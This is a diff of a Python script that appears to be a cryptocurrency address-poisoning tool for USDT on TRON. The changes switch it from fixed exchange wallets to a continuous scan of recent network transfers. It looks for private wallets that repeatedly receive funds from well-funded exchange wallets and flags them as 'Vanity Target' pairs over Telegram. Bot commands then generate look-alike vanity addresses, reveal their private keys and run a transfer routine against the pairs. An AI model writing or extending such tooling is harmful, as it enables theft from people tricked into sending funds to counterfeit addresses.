@@ -4,7 +4,7 @@ import requests
 from collections import defaultdict
 from datetime import datetime, timedelta, timezone
 
-print("🚀 Starting Targeted 2-Week Scanner...")
+print("🚀 Starting Persistent 2-Week Scanner...")
 
 # =========================
 #  SETTINGS
@@ -14,6 +14,7 @@ MIN_TRANSFER_USD = 50           # Each transfer must be >$50
 MIN_CEX_BALANCE_USD = 500       # Wallet A (CEX) must have ≥$500
 WEEKS_BACK = 2
 GAS_COST_PER_PAIR = 2.2
+MAX_SCAN_MINUTES = 10           # Will keep scanning for 10 minutes
 
 TELEGRAM_BOT_TOKEN = os.getenv("TELEGRAM_BOT_TOKEN", "")
 CHAT_ID = os.getenv("CHAT_ID", "")
@@ -23,19 +24,10 @@ PRIVATE_KEY = os.getenv("PRIVATE_KEY", "")
 
 CEX_KEYWORDS = ['binance', 'okx', 'huobi', 'htx', 'gate', 'kucoin', 'bybit', 'mexc', 'bitfinex', 'coinbase', 'kraken', 'bitget', 'poloniex']
 
-# We scan these KNOWN CEX addresses directly to guarantee we find the 2-week pattern
-KNOWN_CEX_WALLETS = [
-    "TYASr5UV6HEcXatwdFQfmLVUqQQQMUxHLS", # Binance-Hot 3
-    "TUpHuDkiCCmwaTZBHZvQ...", # Kucoin 4 (Replace with full address if needed, or use others below)
-    "TDqSquXBgUCLYvYC4XZg...", # Binance-Hot 7
-    "TNXoiAJ3dct8Fjg4M9fk...", # Binance-Hot 4
-    "TCLgK89AnXbC9rewhNb...", # Binance-Hot 10
-    # Add more known CEX hot wallets here
-]
-
 found_pairs = []
 excluded_pairs = set()
 vanity_wallets = {}
+checked_wallets = set() # To avoid checking the same Wallet B twice
 TELEGRAM_URL = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}"
 
 def send_telegram(message):
@@ -68,6 +60,11 @@ def get_wallet_history(address, limit=10):
 
 def generate_vanity_wallet(target_address, max_attempts=50000):
     print(f"  🔨 Generating vanity wallet mimicking {target_address[:20]}...")
+    try:
+        from tronpy.keys import PrivateKey
+    except:
+        return None, None, 0, 0
+        
     best_addr, best_key, best_score = None, None, 0
     best_prefix, best_suffix = 0, 0
     
@@ -90,10 +87,10 @@ def generate_vanity_wallet(target_address, max_attempts=50000):
     print(f"  ✅ Generated vanity: {best_prefix}/8 prefix + {best_suffix}/8 suffix = {best_score}/16")
     return best_addr, best_key, best_prefix, best_suffix
 
-send_telegram("🚀 <b>Targeted 2-Week Scanner Started</b>\nScanning known CEX wallets for 2+ transfers to private wallets.\nRules: >$50/transfer, CEX Balance ≥$500.")
+send_telegram("🚀 <b>Persistent Scanner Started</b>\nScanning network continuously for 10 minutes.\nRules: >$50/transfer, CEX Balance ≥$500, 2-week history.")
 
 # =========================
-# PHASE 1: TARGETED 2-WEEK SCAN
+# PHASE 1: PERSISTENT 2-WEEK SCAN
 # =========================
 end_date = datetime.now(timezone.utc)
 start_date = end_date - timedelta(weeks=WEEKS_BACK)
@@ -102,22 +99,22 @@ end_ms = int(end_date.timestamp() * 1000)
 
 print(f"📅 Scanning window: {start_date.strftime('%Y-%m-%d')} to {end_date.strftime('%Y-%m-%d')}")
 
-for cex_address in KNOWN_CEX_WALLETS:
-    if len(found_pairs) >= TARGET_PAIRS:
-        break
-        
-    print(f"\n Scanning CEX: {cex_address}")
+start_time = time.time()
+offset = 0
+
+print("🔄 Starting persistent loop...")
+
+while len(found_pairs) < TARGET_PAIRS and (time.time() - start_time) < (MAX_SCAN_MINUTES * 60):
+    elapsed = int(time.time() - start_time)
+    print(f"\n Time: {elapsed}s | Found: {len(found_pairs)}/{TARGET_PAIRS} | Offset: {offset}")
     
     try:
-        # Get outgoing transfers from THIS specific CEX for the last 2 weeks
+        # 1. Fetch a batch of recent network transfers
         r = requests.get(
             "https://apilist.tronscanapi.com/api/token_trc20/transfers",
             params={
-                "address": cex_address,
-                "only_from": "true", # Only outgoing
-                "start_timestamp": start_ms,
-                "end_timestamp": end_ms,
-                "limit": 200,
+                "start": offset,
+                "limit": 100,
                 "contract_address": "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t",
                 "sort": "-timestamp"
             },
@@ -126,64 +123,113 @@ for cex_address in KNOWN_CEX_WALLETS:
         )
         
         transfers = r.json().get("token_transfers", [])
-        print(f"  Found {len(transfers)} outgoing transfers in 2 weeks.")
+        if not transfers:
+            print("  ⚠️ No more transfers, waiting...")
+            time.sleep(15)
+            continue
+            
+        print(f"   Got {len(transfers)} transfers. Extracting receivers...")
         
-        # Group by Receiver (Wallet B)
-        receivers = defaultdict(list)
+        # 2. Extract unique Wallet B (receivers) from this batch
+        batch_receivers = set()
         for tx in transfers:
             to_addr = tx.get("to_address")
-            amount = int(tx.get("quant", 0)) / 1_000_000
-            tag = tx.get("from_address_tag", {})
-            
-            if to_addr and amount > MIN_TRANSFER_USD:
-                receivers[to_addr].append({"amount": amount, "tag": tag})
+            if to_addr and to_addr not in checked_wallets:
+                batch_receivers.add(to_addr)
+                
+        print(f"  Found {len(batch_receivers)} new wallets to check historically.")
         
-        # Check for 2+ transfers to the same Wallet B
-        for wallet_b, transfer_list in receivers.items():
-            if len(found_pairs) >= TARGET_PAIRS:
-                break
+        # 3. Check the 2-week history of each new Wallet B
+        for wallet_b in batch_receivers:
+            if len(found_pairs) >= TARGET_PAIRS: break
+            checked_wallets.add(wallet_b)
+            
+            try:
+                # Get THIS wallet's history for the last 2 weeks
+                r_hist = requests.get(
+                    "https://apilist.tronscanapi.com/api/token_trc20/transfers",
+                    params={
+                        "address": wallet_b, 
+                        "start_timestamp": start_ms, 
+                        "end_timestamp": end_ms,
+                        "limit": 200,
+                        "contract_address": "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t"
+                    },
+                    headers={"TRON-PRO-API-KEY": TRONSCAN_API_KEY} if TRONSCAN_API_KEY else {},
+                    timeout=30
+                )
                 
-            if len(transfer_list) >= 2:
-                print(f"  🎯 Pattern found! Sent {len(transfer_list)} times to {wallet_b[:20]}...")
+                history = r_hist.json().get("token_transfers", [])
                 
-                cex_name = "Known CEX"
-                if transfer_list[0]["tag"]:
-                    cex_name = transfer_list[0]["tag"].get("from_address_tag", "Known CEX")
+                # Group by Sender (Wallet A)
+                by_sender = defaultdict(list)
+                for tx in history:
+                    # Ensure this was an INCOMING transfer to wallet_b
+                    if tx.get("to_address") == wallet_b:
+                        from_addr = tx.get("from_address")
+                        amount = int(tx.get("quant", 0)) / 1_000_000
+                        tag = tx.get("from_address_tag", {})
+                        
+                        if from_addr and amount > MIN_TRANSFER_USD:
+                            by_sender[from_addr].append({"amount": amount, "tag": tag})
                 
-                # CHECK WALLET A (CEX) BALANCE
-                print(f"  💰 Checking CEX balance...")
-                cex_balance = get_usdt_balance(cex_address)
-                print(f"  CEX Balance: ${cex_balance}")
-                
-                if cex_balance >= MIN_CEX_BALANCE_USD:
-                    total_volume = sum(t["amount"] for t in transfer_list)
-                    
-                    found_pairs.append({
-                        "wallet_a": cex_address,
-                        "wallet_b": wallet_b,
-                        "cex_name": cex_name,
-                        "transfer_count": len(transfer_list),
-                        "total_amount": total_volume,
-                        "cex_balance": cex_balance
-                    })
-                    
-                    msg = (f"✅ <b>Pair #{len(found_pairs)}</b>\n\n"
-                           f" <b>Wallet A (CEX):</b> {cex_name}\n<code>{cex_address}</code>\n"
-                           f" <b>CEX Balance:</b> ${cex_balance:,.2f}\n\n"
-                           f"👤 <b>Wallet B (Private - Vanity Target):</b>\n<code>{wallet_b}</code>\n\n"
-                           f" <b>2-Week Pattern:</b>\n"
-                           f"• Wallet A sent to Wallet B: <b>{len(transfer_list)} times</b>\n"
-                           f"• Each transfer: >${MIN_TRANSFER_USD}\n"
-                           f"• Total Volume: ${total_volume:,.2f}")
-                    
-                    send_telegram(msg)
-                else:
-                    print(f"  ❌ CEX balance too low: ${cex_balance} < ${MIN_CEX_BALANCE_USD}")
-                    
+                # Check for 2+ transfers from the same Wallet A
+                for wallet_a, transfer_list in by_sender.items():
+                    if len(transfer_list) >= 2:
+                        print(f"    🎯 Pattern: {wallet_a[:20]}... → {wallet_b[:20]}... ({len(transfer_list)}x)")
+                        
+                        # Check if Wallet A is CEX
+                        tag_name = transfer_list[0]["tag"].get("from_address_tag", "").lower() if transfer_list[0]["tag"] else ""
+                        is_cex = any(k in tag_name for k in CEX_KEYWORDS)
+                        cex_name = transfer_list[0]["tag"].get("from_address_tag", "Unknown") if transfer_list[0]["tag"] else "Unknown"
+                        
+                        if is_cex:
+                            # CHECK WALLET A (CEX) BALANCE
+                            print(f"    💰 Checking CEX balance for {wallet_a[:20]}...")
+                            cex_balance = get_usdt_balance(wallet_a)
+                            print(f"    CEX Balance: ${cex_balance}")
+                            
+                            if cex_balance >= MIN_CEX_BALANCE_USD:
+                                total_volume = sum(t["amount"] for t in transfer_list)
+                                
+                                found_pairs.append({
+                                    "wallet_a": wallet_a,
+                                    "wallet_b": wallet_b,
+                                    "cex_name": cex_name,
+                                    "transfer_count": len(transfer_list),
+                                    "total_amount": total_volume,
+                                    "cex_balance": cex_balance
+                                })
+                                
+                                msg = (f"✅ <b>Pair #{len(found_pairs)}</b>\n\n"
+                                       f"🏦 <b>Wallet A (CEX):</b> {cex_name}\n<code>{wallet_a}</code>\n"
+                                       f"💼 <b>CEX Balance:</b> ${cex_balance:,.2f}\n\n"
+                                       f"👤 <b>Wallet B (Private - Vanity Target):</b>\n<code>{wallet_b}</code>\n\n"
+                                       f"📊 <b>2-Week Pattern:</b>\n"
+                                       f"• Wallet A sent to Wallet B: <b>{len(transfer_list)} times</b>\n"
+                                       f"• Each transfer: >${MIN_TRANSFER_USD}\n"
+                                       f"• Total Volume: ${total_volume:,.2f}")
+                                
+                                send_telegram(msg)
+                                print(f"    ✅ Qualified! Pair #{len(found_pairs)}")
+                            else:
+                                print(f"    ❌ CEX balance too low: ${cex_balance}")
+                                
+            except Exception as e:
+                print(f"    ❌ Error checking {wallet_b[:20]}...: {e}")
+            
+            time.sleep(0.5) # Rate limit protection
+            
+        # Move to next batch
+        offset += 100
+        
+        if len(found_pairs) < TARGET_PAIRS:
+            print(f"  ⏳ Waiting 15 seconds before next batch...")
+            time.sleep(15)
+            
     except Exception as e:
-        print(f"❌ API Error: {e}")
-    
-    time.sleep(2)
+        print(f"❌ Batch error: {e}")
+        time.sleep(10)
 
 # =========================
 # PHASE 2: INTERACTIVE MODE
@@ -197,14 +243,14 @@ def calc_cost():
 if found_pairs:
     send_telegram(f"🎯 <b>Found {len(found_pairs)} pairs!</b>\n\nCommands:\n• <b>info</b>\n• <b>exclude [1-5]</b>\n• <b>history [wallet]</b>\n• <b>cost</b>\n• <b>vanity [ID] [Pair#]</b>\n• <b>transfer</b>")
 else:
-    send_telegram("⚠️ <b>No qualifying pairs found.</b>\nCheck GitHub logs to see if CEX balances were too low.")
+    send_telegram("⚠️ <b>No qualifying pairs found in 10 minutes.</b>\nTry running again.")
 
 last_id = 0
 start_wait = time.time()
 
 while True:
     if time.time() - start_wait > 600:
-        send_telegram("⏰ <b>Timed out</b>")
+        send_telegram("⏰ <b>Session timed out</b>")
         break
 
     try:
@@ -252,7 +298,7 @@ while True:
                         amount = int(tx.get("quant", 0)) / 1_000_000
                         from_addr = tx.get("from_address", "Unknown")
                         date = datetime.fromtimestamp(tx.get("block_ts", 0)/1000).strftime("%m/%d %H:%M")
-                        msg += f"<b>#{i+1}</b> {date}\n ${amount:,.2f}\nFrom: <code>{from_addr[:20]}...</code>\n\n"
+                        msg += f"<b>#{i+1}</b> {date}\n💰 ${amount:,.2f}\nFrom: <code>{from_addr[:20]}...</code>\n\n"
                     send_telegram(msg)
                 else: send_telegram("📭 No transactions")
             
@@ -268,6 +314,9 @@ while True:
                         p_num = int(parts[2]) - 1
                         if 0 <= p_num < len(found_pairs):
                             addr, key, prefix, suffix = generate_vanity_wallet(found_pairs[p_num]['wallet_b'])
+                            if not addr:
+                                send_telegram("❌ Error generating vanity.")
+                                continue
                             vanity_wallets[vid] = {
                                 "address": addr, "private_key": key,
                                 "target_pair": p_num+1, "target_wallet_b": found_pairs[p_num]['wallet_b'],
@@ -298,7 +347,7 @@ while True:
                                 send_telegram(f"📊 <b>Vanity #{vid}</b>\n\n<b>Address:</b> <code>{v['address']}</code>\n<b>Private Key:</b> <code>{v['private_key']}</code>\n\n<b>Mimics:</b> <code>{v['target_wallet_b'][:30]}...</code>\n<b>Similarity:</b> {v['prefix_match']}/{v['suffix_match']}\n\n<b>TRX Balance:</b> {trx_bal:.6f}\n<b>Alerts:</b> {'🔔 ON' if v['alert_active'] else '🔕 OFF'}")
                             except Exception as e: send_telegram(f"❌ Error: {e}")
                         else: send_telegram(f"❌ Vanity #{vid} not found")
-                except Exception as e: send_telegram(f"❌ Error: {e}")
+                except Exception as e: send_telegram(f" Error: {e}")
             
             elif parts[0] == "transfer":
                 active = get_active_pairs()
@@ -335,7 +384,7 @@ while True:
                             pair_num += 1
                             time.sleep(5)
                         send_telegram("✅ <b>Done!</b>")
-                    except Exception as e: send_telegram(f" Error: {e}")
+                    except Exception as e: send_telegram(f"❌ Error: {e}")
                     break
 
     time.sleep(5)
